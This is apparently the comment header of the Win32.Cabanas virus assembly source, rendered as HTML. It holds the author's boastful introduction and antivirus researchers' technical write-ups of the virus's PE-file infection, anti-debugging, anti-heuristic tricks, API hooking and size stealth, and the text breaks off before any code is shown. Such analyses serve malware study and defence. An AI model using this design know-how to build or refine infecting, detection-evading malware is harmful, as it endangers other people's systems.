<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/1999/REC-html401-19991224/strict.dtd">
<html>
<head>
<META http-equiv=Content-Type content="text/html; charset=windows-1252">
<title>Virus.Win32.Cabanas.b - cabanas.asm.html</title>
<style type="text/css">
span {
	font-family: 'Courier New';
	font-size: 10pt;
	color: #000000;
}
.sc0 {
}
.sc1 {
	color: #008000;
}
.sc2 {
	color: #FF8000;
}
.sc3 {
	color: #808080;
}
.sc4 {
	font-weight: bold;
	color: #000080;
}
.sc5 {
}
.sc6 {
	font-weight: bold;
	color: #0000FF;
}
.sc8 {
	font-weight: bold;
	color: #8080FF;
}
.sc9 {
	color: #0080FF;
}
.sc10 {
	font-weight: bold;
	color: #000080;
}
.sc12 {
	color: #808000;
}
.sc13 {
	color: #808080;
}
</style>
</head>
<body>
<div style="float: left; white-space: pre; line-height: 1; background: #FFFFFF; "><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;                                                  ÜÛÛÛÛÛÜ ÜÛÛÛÛÛÜ ÜÛÛÛÛÛÜ</span><span class="sc0">
</span><span class="sc1">;          Win32.Cabanas.2999                      ÛÛÛ ÛÛÛ ÛÛÛ ÛÛÛ ÛÛÛ ÛÛÛ</span><span class="sc0">
</span><span class="sc1">;          by Jacky Qwerty/29A                      ÜÜÜÛÛß ßÛÛÛÛÛÛ ÛÛÛÛÛÛÛ</span><span class="sc0">
</span><span class="sc1">;                                                  ÛÛÛÜÜÜÜ ÜÜÜÜÛÛÛ ÛÛÛ ÛÛÛ</span><span class="sc0">
</span><span class="sc1">;                                                  ÛÛÛÛÛÛÛ ÛÛÛÛÛÛß ÛÛÛ ÛÛÛ</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; I'm very proud to introduce the first "resident" WinNT/Win95/Win32s virus.</span><span class="sc0">
</span><span class="sc1">; Not only it's the first virus stayin resident on NT, but is also the first</span><span class="sc0">
</span><span class="sc1">; with stealth, antidebuggin and antiheuristic capabilitiez. In short wordz,</span><span class="sc0">
</span><span class="sc1">; this babe is a "per process" memory resident, size stealth virus infecting</span><span class="sc0">
</span><span class="sc1">; Portable Executable filez on every existin  Win32-based  system. Those who</span><span class="sc0">
</span><span class="sc1">; dont know what a "per process" resident virus is, it means a virus staying</span><span class="sc0">
</span><span class="sc1">; resident inside the host Win32 aplication's private space, monitoring file</span><span class="sc0">
</span><span class="sc1">; activity and infectin PE filez opened or accesed by such Win32 aplication.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; The purpose of this virus is to prove new residency techniquez that can be</span><span class="sc0">
</span><span class="sc1">; exploited from genuine Win32 infectorz, without all the trouble of writing</span><span class="sc0">
</span><span class="sc1">; especific driverz for Win95 (VxDs), and WinNT. A genuine Win32 infector is</span><span class="sc0">
</span><span class="sc1">; a virus bein able to work unmodified across all Win32 platformz available:</span><span class="sc0">
</span><span class="sc1">; Win95, WinNT and any other future platform suportin the Win32 API interfa-</span><span class="sc0">
</span><span class="sc1">; ce. So far only Win95 especific virusez have been found, not Win32 genuine</span><span class="sc0">
</span><span class="sc1">; onez. Make sure to read the complete description about Win32.Cabanas writ-</span><span class="sc0">
</span><span class="sc1">; ten by P‚ter Sz”r, available at http://www.avp.ch/avpve/newexe/win32/caba-</span><span class="sc0">
</span><span class="sc1">; nas.stm. U can also read description by Igor Daniloff from Dr.Web, availa-</span><span class="sc0">
</span><span class="sc1">; ble at http://www.dials.ccas.ru/inf/cabanas.htm as well.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; After readin P‚ter Sz”r's description about Win32.Cabanas, i realized he'd</span><span class="sc0">
</span><span class="sc1">; really made a very serious profesional work. So good that he didnt seem to</span><span class="sc0">
</span><span class="sc1">; miss any internail detail in  the virus, as if he  had actually writen the</span><span class="sc0">
</span><span class="sc1">; bug himself or as if he was actually me, hehe. Obviosly, none of the prior</span><span class="sc0">
</span><span class="sc1">; onez are true. But, nevertheless, i think it's worth to take his work into</span><span class="sc0">
</span><span class="sc1">; account even from the VX side of the fence. Really i dunno what's left for</span><span class="sc0">
</span><span class="sc1">; me to say after such description, so i will simply add my own personal co-</span><span class="sc0">
</span><span class="sc1">; mentz to P‚ter's log. Erm.. btw why dont u join us? heh &gt;8P</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - &gt;8</span><span class="sc0">
</span><span class="sc1">; 1. Technical Description</span><span class="sc0">
</span><span class="sc1">; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">
</span><span class="sc1">; Win32.Cabanas is the first known 32-bit virus that works under Windows NT</span><span class="sc0">
</span><span class="sc1">; Server, Windows NT workstation, Windows 95 and Windows 3.x extended with</span><span class="sc0">
</span><span class="sc1">; Win32s sub-system. It was found in late 1997.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; Win32.Cabanas is a per-process memory resident, fast infecting, antidebug-</span><span class="sc0">
</span><span class="sc1">; ged, partially packed/encrypted, anti-heuristic, semi-stealth virus. The</span><span class="sc0">
</span><span class="sc1">; "Win32" prefix is not misleading, as the virus is also able to spread in</span><span class="sc0">
</span><span class="sc1">; all Win32 based systems: Windows NT, Windows 95 and Win32s. The author of</span><span class="sc0">
</span><span class="sc1">; the virus is a member of the 29A group, the same young virus writer who</span><span class="sc0">
</span><span class="sc1">; wrote the infamous CAP.A virus.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; 1.1. Running an infected PE file</span><span class="sc0">
</span><span class="sc1">; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">
</span><span class="sc1">; When a Win32.Cabanas infected file is executed, the execution will start</span><span class="sc0">
</span><span class="sc1">; at the original host entry point. Surprisingly, Cabanas does not touch</span><span class="sc0">
</span><span class="sc1">; the entry point field in the Image File Header. Instead it patches the</span><span class="sc0">
</span><span class="sc1">; host program at its entry point. Five bytes at the entry point is replaced</span><span class="sc0">
</span><span class="sc1">; with a FAR JMP to the address where the original program ended. This can</span><span class="sc0">
</span><span class="sc1">; be considered as an anti-heuristic feature, as the host entry point value</span><span class="sc0">
</span><span class="sc1">; in the PE header keeps pointing inside the code section, possibly turning</span><span class="sc0">
</span><span class="sc1">; off some heuristic flags.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; Thus the first JMP points to the real entry point. The first function in</span><span class="sc0">
</span><span class="sc1">; Cabanas unpacks and decrypts a string table which consists of Win32 KERNEL</span><span class="sc0">
</span><span class="sc1">; API names. The unpack mechanism is simple but effective enough. Cabanas is</span><span class="sc0">
</span><span class="sc1">; also an armored virus. It uses "Structured Exception Handling" (typically</span><span class="sc0">
</span><span class="sc1">; abbreviated as "SEH") as an anti-debug trick. This prevents debugging from</span><span class="sc0">
</span><span class="sc1">; any application-level debugger, such as TD32.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; When the unpack/decryptor function is ready, the virus calls a routine to</span><span class="sc0">
</span><span class="sc1">; get the original Base Address of KERNEL32.DLL. During infection time, the</span><span class="sc0">
</span><span class="sc1">; virus searches for GetModuleHandleA and GetModuleHandleW API in the Import</span><span class="sc0">
</span><span class="sc1">; Table, respectively. When it finds them, it saves a pointer to the actual</span><span class="sc0">
</span><span class="sc1">; DWORD in the .idata list. Since the loader puts the addresses to this</span><span class="sc0">
</span><span class="sc1">; table before it executes the virus, Cabanas gets them easily.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; If the application does not have a GetModuleHandleA / GetModuleHandleW API</span><span class="sc0">
</span><span class="sc1">; import, the virus uses a third undocumented way to get the Base Address of</span><span class="sc0">
</span><span class="sc1">; KERNEL32.DLL by getting it from the ForwarderChain field in the KERNEL32</span><span class="sc0">
</span><span class="sc1">; import. Actually this will not work under Windows NT, but on Win95 only.</span><span class="sc0">
</span><span class="sc1">; When the virus has the Base Address/Module Handle of KERNEL32.DLL, it</span><span class="sc0">
</span><span class="sc1">; calls its own routine to get the address of GetProcAddress function. The</span><span class="sc0">
</span><span class="sc1">; first method is based on the search of the Import Table during infection</span><span class="sc0">
</span><span class="sc1">; time. The virus saves a pointer to the .idata section whenever it finds a</span><span class="sc0">
</span><span class="sc1">; GetProcAddress import in the host. In most cases Win32 applications import</span><span class="sc0">
</span><span class="sc1">; the GetProcAddress API, thus the virus should not use a secondary routine</span><span class="sc0">
</span><span class="sc1">; to get the same result. If the first method fails, the virus calls another</span><span class="sc0">
</span><span class="sc1">; function which is able to search for GetProcAddress export in KERNEL32.</span><span class="sc0">
</span><span class="sc1">; Such function could be called as GetProcAddress-From-ExportsTable. This</span><span class="sc0">
</span><span class="sc1">; function is able to search in KERNEL32's Exports Table and find the</span><span class="sc0">
</span><span class="sc1">; address of GetProcAddress API.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; This function is one of the most important ones from the virus point of</span><span class="sc0">
</span><span class="sc1">; view and it is compatible with all Win32 based systems. If the entry point</span><span class="sc0">
</span><span class="sc1">; of GetProcAddress was returned by the GetProcAddress-From-ExportsTable</span><span class="sc0">
</span><span class="sc1">; function, the virus saves this address and use it later on. Otherwise, the</span><span class="sc0">
</span><span class="sc1">; GetProcAddress-From-ExportsTable function will be used several times. This</span><span class="sc0">
</span><span class="sc1">; function is also saved with "Structured Exception Handling" to avoid from</span><span class="sc0">
</span><span class="sc1">; possible exceptions. After this, the virus gets all the API addresses it</span><span class="sc0">
</span><span class="sc1">; wants to use in a loop. When the addresses are available, Cabanas is ready</span><span class="sc0">
</span><span class="sc1">; to replicate and call its direct action infection routine.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; 1.2. Direct action infection</span><span class="sc0">
</span><span class="sc1">; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">
</span><span class="sc1">; The direct action infection part is surprisingly fast. Even though the</span><span class="sc0">
</span><span class="sc1">; virus goes through all the files in Windows directory, Windows System</span><span class="sc0">
</span><span class="sc1">; directory and in the current directory respectively, the file infection</span><span class="sc0">
</span><span class="sc1">; is fast enough to go unnoticed in much systems. This is because the virus</span><span class="sc0">
</span><span class="sc1">; works with "memory mapped files", a new feature implemented in Win32 based</span><span class="sc0">
</span><span class="sc1">; systems which simplifies file handling and increases system performance.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; First the virus gets the name of Windows directory, then it gets the name</span><span class="sc0">
</span><span class="sc1">; of Windows System directory and calls the function which searches for non-</span><span class="sc0">
</span><span class="sc1">; infected executable images. It searches for non directory entries and</span><span class="sc0">
</span><span class="sc1">; check the size of the files it found.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; Files with size dividable by 101 without reminder are assumed to be</span><span class="sc0">
</span><span class="sc1">; infected. Other files which are too huge will not be infected either.</span><span class="sc0">
</span><span class="sc1">; After this, the virus checks the file extension, if it matches EXE or</span><span class="sc0">
</span><span class="sc1">; SCR (screen saver files), the virus opens and maps the file. If the file</span><span class="sc0">
</span><span class="sc1">; is considered too short, the file is closed. Then it checks the`MZ' marker</span><span class="sc0">
</span><span class="sc1">; at the beginning of the image. Next it positions to the possible `PE'</span><span class="sc0">
</span><span class="sc1">; header area and checks the `PE' signature. It also checks that the</span><span class="sc0">
</span><span class="sc1">; executable was made to run on 386+ machines and looks for the type of</span><span class="sc0">
</span><span class="sc1">; the file. DLL files are not infected.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; After this, the virus calculates a special checksum which uses the</span><span class="sc0">
</span><span class="sc1">; checksum field of PE files Optional Header and the file-stamp field of</span><span class="sc0">
</span><span class="sc1">; the Image File Header. If the file seems to be infected the virus closes</span><span class="sc0">
</span><span class="sc1">; the file. If not, the file is chosen for infection. Cabanas then closes</span><span class="sc0">
</span><span class="sc1">; the file, blanks the file attribute of the file with SetFileAttributeA API</span><span class="sc0">
</span><span class="sc1">; and saves the original attributes for later use. This means the virus is</span><span class="sc0">
</span><span class="sc1">; not stopped by the "Read Only" attribute. Then again, it opens and maps</span><span class="sc0">
</span><span class="sc1">; the possible host file in read/write mode.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; Next it searches for the GetModuleHandleA, GetModuleHandleW and</span><span class="sc0">
</span><span class="sc1">; GetProcAddress API imports in the host Import Table and calculates</span><span class="sc0">
</span><span class="sc1">; pointers to the .idata section. Then it calls the routine which</span><span class="sc0">
</span><span class="sc1">; patches the virus image into the file.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; This routine first checks that the .idata section has MEM_WRITE</span><span class="sc0">
</span><span class="sc1">; characteristics. If not it sets this flag on the section, but only if</span><span class="sc0">
</span><span class="sc1">; this section is not located in an executable area. This prevents the</span><span class="sc0">
</span><span class="sc1">; virus from turning on suspicious flags on the code section, triggered</span><span class="sc0">
</span><span class="sc1">; by some heuristic scanner.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; Then it goes to the entry point of the image and replaces five bytes</span><span class="sc0">
</span><span class="sc1">; with a FAR JMP instruction which will point to the original end of the</span><span class="sc0">
</span><span class="sc1">; host. After that it checks the relocation table. This is because some</span><span class="sc0">
</span><span class="sc1">; relocations may overwrite the FAR JMP at the entry point. If the</span><span class="sc0">
</span><span class="sc1">; relocation table size is not zero the virus calls a special routine</span><span class="sc0">
</span><span class="sc1">; to search for such relocation entries in the .reloc area. It clears</span><span class="sc0">
</span><span class="sc1">; the relocation type on the relocation record if it points into the FAR</span><span class="sc0">
</span><span class="sc1">; JMP area, thus this relocation will not take into account by the loader.</span><span class="sc0">
</span><span class="sc1">; The routine also marks the relocation, thus Cabanas will be able to</span><span class="sc0">
</span><span class="sc1">; relocate the host later on. Then it crypts all the information which has</span><span class="sc0">
</span><span class="sc1">; to be encrypted in the virus body. Including the table which holds the</span><span class="sc0">
</span><span class="sc1">; original 5 bytes from the entry point and its location.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; Next the virus calculates the special checksum for self checking purposes</span><span class="sc0">
</span><span class="sc1">; and saves this to the time stamp field of the PE header. When everything</span><span class="sc0">
</span><span class="sc1">; is ready, the virus calculates the full new size of the file and makes</span><span class="sc0">
</span><span class="sc1">; this value dividable by 101. The real virus code is around 3000 bytes</span><span class="sc0">
</span><span class="sc1">; only but the files will grow with more bytes, because of this. Cabanas</span><span class="sc0">
</span><span class="sc1">; has a very important trick here. The virus does not create a new section</span><span class="sc0">
</span><span class="sc1">; header to hold its code, but patches the last section header in the file</span><span class="sc0">
</span><span class="sc1">; (usually .reloc) to grow the section body large enough to store the virus</span><span class="sc0">
</span><span class="sc1">; code. This makes the infection less risky and less noticeable.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; Then the virus changes the SizeOfImage field in the PE header to reflect</span><span class="sc0">
</span><span class="sc1">; the changes made to the last section in the file, then unmaps and closes</span><span class="sc0">
</span><span class="sc1">; the file. Next it truncates the file at the previously calculated size</span><span class="sc0">
</span><span class="sc1">; and restores the original time and date stamp. Finally Cabanas resets the</span><span class="sc0">
</span><span class="sc1">; original attribute of the file. When all the possible files have been</span><span class="sc0">
</span><span class="sc1">; checked for infection, Cabanas is ready to go memory resident.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; 1.3. Rebuild the host, Hook API functions and Go memory resident</span><span class="sc0">
</span><span class="sc1">; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">
</span><span class="sc1">; The next phase is to rebuild the host program. The virus locates an</span><span class="sc0">
</span><span class="sc1">; internal parameter block which consists of the previously encrypted code</span><span class="sc0">
</span><span class="sc1">; from the host (5 bytes) and writes back the 5 original bytes at the entry</span><span class="sc0">
</span><span class="sc1">; point. After this, it relocates the code area if needed, by searching in</span><span class="sc0">
</span><span class="sc1">; the .reloc section for marked relocation entries. Next the virus hooks</span><span class="sc0">
</span><span class="sc1">; API functions and goes memory resident.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; The API hooking technique is based on the manipulation of the Import</span><span class="sc0">
</span><span class="sc1">; Table. Since the host program holds the addresses of imported functions</span><span class="sc0">
</span><span class="sc1">; in its .idata section, all the virus has to do is to replace those</span><span class="sc0">
</span><span class="sc1">; addresses to point to its own API handlers.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; To make those calculations easy, the virus opens and maps the infected</span><span class="sc0">
</span><span class="sc1">; program. Then it allocates memory for its per-process part. The virus</span><span class="sc0">
</span><span class="sc1">; allocates a 12232 bytes block and copies itself into this new allocated</span><span class="sc0">
</span><span class="sc1">; area. Then it searches for all the possible function names it wants to</span><span class="sc0">
</span><span class="sc1">; hook: GetProcAddress, GetFileAttributesA, GetFileAttributesW, MoveFileExA,</span><span class="sc0">
</span><span class="sc1">; MoveFileExW, _lopen, CopyFileA, CopyFileW, OpenFile, MoveFileA, MoveFileW,</span><span class="sc0">
</span><span class="sc1">; CreateProcessA, CreateProcessW, CreateFileA, CreateFileW, FindClose,</span><span class="sc0">
</span><span class="sc1">; FindFirstFileA, FindFirstFileW, FindNextFileA, FindNextFileW, SetFileAttrA,</span><span class="sc0">
</span><span class="sc1">; SetFileAttrW. Whenever it finds one of the latter APIs, it saves the</span><span class="sc0">
</span><span class="sc1">; original address to its own JMP table and replaces the .idata section's</span><span class="sc0">
</span><span class="sc1">; DWORD (which holds the original address of the API) with a pointer to its</span><span class="sc0">
</span><span class="sc1">; own API handlers.  Finally the virus closes and unmaps the host and starts</span><span class="sc0">
</span><span class="sc1">; the application, by jumping into the original entry point in the code</span><span class="sc0">
</span><span class="sc1">; section.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; Some Win32 applications however may not have imports for some of these</span><span class="sc0">
</span><span class="sc1">; file related APIs, they can rather retrieve their addresses by using</span><span class="sc0">
</span><span class="sc1">; GetProcAddress and call them directly, thus the virus would be unable</span><span class="sc0">
</span><span class="sc1">; to hook this calls. Not so fast. The virus also hooks GetProcAddress</span><span class="sc0">
</span><span class="sc1">; for a special purpose. GetProcAddress is used by most applications.</span><span class="sc0">
</span><span class="sc1">; When the application calls GetProcAddress the virus new handler first</span><span class="sc0">
</span><span class="sc1">; calls the original GetProcAddress to get the address of the requested</span><span class="sc0">
</span><span class="sc1">; API. Then it checks if the Module Handle parameter is from KERNEL32 and</span><span class="sc0">
</span><span class="sc1">; if the function is one of the KERNEL32 APIs that the virus wants to hook.</span><span class="sc0">
</span><span class="sc1">; If so, the virus returns a new API address which will point into its</span><span class="sc0">
</span><span class="sc1">; NewJMPTable. Thus the application will still get an address to the virus</span><span class="sc0">
</span><span class="sc1">; new handler in such cases as well.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; 1.4. Stealth and fast infection capabilities</span><span class="sc0">
</span><span class="sc1">; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">
</span><span class="sc1">; Cabanas is a semi-stealth virus: during FindFirstFileA,  FindFirstFileW,</span><span class="sc0">
</span><span class="sc1">; FindNextFileA and FindNextFileW, the virus checks for already infected</span><span class="sc0">
</span><span class="sc1">; programs. If the program is not infected the virus will infect it,</span><span class="sc0">
</span><span class="sc1">; otherwise it hides the file size difference by returning the original</span><span class="sc0">
</span><span class="sc1">; size for the host program. During this, the virus can see all the file</span><span class="sc0">
</span><span class="sc1">; names the application accesses and infects every single clean file.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; Since the CMD.EXE (Command Interpreter of Windows NT) is using the above</span><span class="sc0">
</span><span class="sc1">; APIs during a DIR command, every non infected file will be infected (if</span><span class="sc0">
</span><span class="sc1">; the CMD.EXE was infected previously by Win32.Cabanas). The virus will</span><span class="sc0">
</span><span class="sc1">; infect files during every other hooked API request as well.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; Apart from the encrypted API names strings, the virus also contains the</span><span class="sc0">
</span><span class="sc1">; following copyright message:</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; (c) Win32.Cabanas v1.0 by jqwerty/29A.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; 1.5. Conclusion</span><span class="sc0">
</span><span class="sc1">; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">
</span><span class="sc1">; Win32.Cabanas is a very complex virus with several features new in Win32</span><span class="sc0">
</span><span class="sc1">; based systems. It shows quite interesting techniques that can be used in</span><span class="sc0">
</span><span class="sc1">; the near future. It demonstrates that a Windows NT virus should not have</span><span class="sc0">
</span><span class="sc1">; any Windows 95 or Windows NT especific functionality in order to work on</span><span class="sc0">
</span><span class="sc1">; any Win32 system. The "per-process" residency technique also shows a</span><span class="sc0">
</span><span class="sc1">; portable viable solution to avoid known compatibility issues between</span><span class="sc0">
</span><span class="sc1">; Windows 95 and Windows NT respecting their low level resident driver</span><span class="sc0">
</span><span class="sc1">; implementations. Virus writers can use these techniques and their</span><span class="sc0">
</span><span class="sc1">; knowledge they have had on Windows 95 to come to a more robust platform.</span><span class="sc0">
</span><span class="sc1">; So far Win32.Cabanas has made this first step.</span><span class="sc0">
</span><span class="sc1">; - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - &gt;8</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; 2. Shortcutz</span><span class="sc0">
</span><span class="sc1">; ÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">
</span><span class="sc1">; (*) http://www.dials.ccas.ru/inf/cabanas.htm</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - &gt;8</span><span class="sc0">
</span><span class="sc1">;                     Win32.Cabanas: A brief description</span><span class="sc0">
</span><span class="sc1">;                     ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">
</span><span class="sc1">;                                                           Igor A. Daniloff</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; Win32.Cabanas is the first known virus that infects files under Microsoft</span><span class="sc0">
</span><span class="sc1">; 32-bit Windows operating systems (Win32s/Windows 95/Windows NT). Not only</span><span class="sc0">
</span><span class="sc1">; is it capable of infecting PortableExecutable files, but also remains</span><span class="sc0">
</span><span class="sc1">; resident in the current session of an infected program in all these</span><span class="sc0">
</span><span class="sc1">; Windows systems.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; The viruses specifically designed for Windows 95 thus far could not</span><span class="sc0">
</span><span class="sc1">; properly infect files in Windows NT. Although files of Windows 95 and</span><span class="sc0">
</span><span class="sc1">; Windows NT have identical PE format, certain fields in their PE headers</span><span class="sc0">
</span><span class="sc1">; are different. Therefore, for infecting files under Windows NT, the PE</span><span class="sc0">
</span><span class="sc1">; header must be modified appropriately; otherwise Windows NT would display</span><span class="sc0">
</span><span class="sc1">; an error message in the course of loading the file. Furthermore, viruses</span><span class="sc0">
</span><span class="sc1">; encounter certain problems in determining the base addresses of WIN32</span><span class="sc0">
</span><span class="sc1">; KERNEL API in the memory, because KERNEL32.DLL in Windows 95 and Windows</span><span class="sc0">
</span><span class="sc1">; NT are located at different memory addresses. But Win32.Cabanas smartly</span><span class="sc0">
</span><span class="sc1">; handles these problems. On starting an infected file, the virus gets</span><span class="sc0">
</span><span class="sc1">; control, unpacks and decrypts its table of names of WIN32 KERNEL API</span><span class="sc0">
</span><span class="sc1">; procedures that are needed in the sequel, and then determines the base</span><span class="sc0">
</span><span class="sc1">; address of KERNEL32.DLL and the addresses of all necessary WIN32 KERNEL</span><span class="sc0">
</span><span class="sc1">; API functions.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; While infecting a file, Win32.Cabanas finds the names of GetModuleHandleA,</span><span class="sc0">
</span><span class="sc1">; GetModuleHandleW, and GetProcAddress functions from the Import Table and</span><span class="sc0">
</span><span class="sc1">; stores in its code the offsets of the addresses of these procedures in the</span><span class="sc0">
</span><span class="sc1">; Import Table (in the segment .idata, as a rule). If the names of these</span><span class="sc0">
</span><span class="sc1">; procedures are not detectable, Win32.Cabanas uses a different undocumented</span><span class="sc0">
</span><span class="sc1">; method of finding the base address of KERNEL32 and the addresses of WIN32</span><span class="sc0">
</span><span class="sc1">; KERNEL API. But there is a bug in this undocumented method; therefore the</span><span class="sc0">
</span><span class="sc1">; method is inoperative under Windows NT. If the addresses of</span><span class="sc0">
</span><span class="sc1">; GetModuleHandleA or GetModuleHandleW functions are available in the Import</span><span class="sc0">
</span><span class="sc1">; Table of the infected file, the virus easily determines the WIN32 KERNEL</span><span class="sc0">
</span><span class="sc1">; API addresses through the GetProcAddress procedure. If the addresses are</span><span class="sc0">
</span><span class="sc1">; not available in the Import Table, the virus craftily finds the address of</span><span class="sc0">
</span><span class="sc1">; GetProcAddress from the Export Table of KERNEL32. As already mentioned,</span><span class="sc0">
</span><span class="sc1">; this virus mechanism is not operative under Windows NT due to a bug, and,</span><span class="sc0">
</span><span class="sc1">; as a consequence, the normal "activity" of the virus is disabled. This is</span><span class="sc0">
</span><span class="sc1">; the only serious bug that prevents the proliferation of Win32.Cabanas</span><span class="sc0">
</span><span class="sc1">; under Windows NT. On the contrary, in Windows 95 the virus "feels</span><span class="sc0">
</span><span class="sc1">; completely at home" and straightforwardly (even in the absence of the</span><span class="sc0">
</span><span class="sc1">; addresses of GetModuleHandleA or GetModuleHandleW) determines the base</span><span class="sc0">
</span><span class="sc1">; address of KERNEL32.DLL and GetProcAddress via an undocumented method.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; Using the GetProcAddress function, Win32.Cabanas can easily get the</span><span class="sc0">
</span><span class="sc1">; address of any WIN32 KERNEL API procedure that it needs. This is precisely</span><span class="sc0">
</span><span class="sc1">; what the virus does: it gets the addresses and stores them.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; Then Win32.Cabanas initiates its engine for infecting EXE and SCR PE-files</span><span class="sc0">
</span><span class="sc1">; in \WINDOWS, \WINDOWS\SYSTEM, and the current folder. Prior to infecting a</span><span class="sc0">
</span><span class="sc1">; file, the virus checks for a copy of its code through certain fields in</span><span class="sc0">
</span><span class="sc1">; the PE header and by the file size, which for an infected must be a</span><span class="sc0">
</span><span class="sc1">; multiple of 101. As already mentioned, the virus searches for the names of</span><span class="sc0">
</span><span class="sc1">; GetModuleHandleA, GetModuleHandleW or GetProcAddress in the Import Table</span><span class="sc0">
</span><span class="sc1">; and saves the references to their addresses. Then it appends its code at</span><span class="sc0">
</span><span class="sc1">; the file end in the last segment section (usually, .reloc) after modifying</span><span class="sc0">
</span><span class="sc1">; the characteristics and size of this section. Thereafter, the virus</span><span class="sc0">
</span><span class="sc1">; replaces the five initial bytes of the original entry point of the code</span><span class="sc0">
</span><span class="sc1">; section (usually, .text or CODE) by a command for transferring control to</span><span class="sc0">
</span><span class="sc1">; the virus code in the last segment section (.reloc). For this purpose, the</span><span class="sc0">
</span><span class="sc1">; virus examines the relocation table (.reloc) for finding some element in</span><span class="sc0">
</span><span class="sc1">; the region of bytes that the virus had modified. If any, the virus</span><span class="sc0">
</span><span class="sc1">; "disables" the reference and stores its address and value for restoring</span><span class="sc0">
</span><span class="sc1">; the initial bytes of the entry point at the time of transfer of control</span><span class="sc0">
</span><span class="sc1">; to the host program and, if necessary, for appropriately configuring the</span><span class="sc0">
</span><span class="sc1">; relocation.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; After infecting all files that yield to infection in \WINDOWS, \WINDOWS\
; SYSTEM, and in the current folder, the virus plants a resident copy into</span><span class="sc0">
</span><span class="sc1">; the system and "intercepts" the necessary system functions. Using</span><span class="sc0">
</span><span class="sc1">; VirtualAlloc, the virus allots for itself 12232 bytes in the memory and</span><span class="sc0">
</span><span class="sc1">; plants its code there. Then it tries to "intercept" the following WIN32</span><span class="sc0">
</span><span class="sc1">; KERNEL API functions: GetProcAddress, GetFileAttributesA,</span><span class="sc0">
</span><span class="sc1">; GetFileAttributesW, MoveFileExA, MoveFileExW, _loopen, CopyFileA,</span><span class="sc0">
</span><span class="sc1">; CopyFileW, OpenFile, MoveFileA, MoveFileW, CreateProcessA, CreateProcessW,</span><span class="sc0">
